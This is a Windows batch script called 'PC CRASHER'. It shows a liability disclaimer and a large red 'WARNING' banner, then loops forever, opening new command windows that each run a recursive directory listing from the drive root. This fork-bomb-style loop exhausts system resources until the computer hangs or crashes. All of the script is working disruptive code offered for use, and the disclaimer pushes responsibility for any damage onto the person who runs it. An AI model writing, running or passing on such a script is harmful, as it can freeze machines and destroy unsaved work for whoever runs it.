@echo off
title PC CRASHER

chcp 65001
cls
echo [1;91;40mDISCLAIMER:[0m By using this program, you acknowledge and accept full responsibility for any potential loss of data or damage to your system, and release the author from any liability arising from its use.
echo [1;91;40m██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ [0m
echo [1;91;40m██║    ██║██╔══██╗██╔══██╗████╗  ██║██║████╗  ██║██╔════╝ [0m
echo [1;91;40m██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██╔██╗ ██║██║  ███╗[0m
echo [1;91;40m██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║╚██╗██║██║   ██║[0m
echo [1;91;40m╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║██║ ╚████║╚██████╔╝[0m
echo [1;91;40m ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ [0m
echo This [1;91;40mWILL CRASH[0m your computer
echo Once you run this there is [1;91;40mNO[0m going back
pause
cls

:crash
start "PC CRASHER" cmd /k "cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & cd .. & color a & dir /s"
goto crash

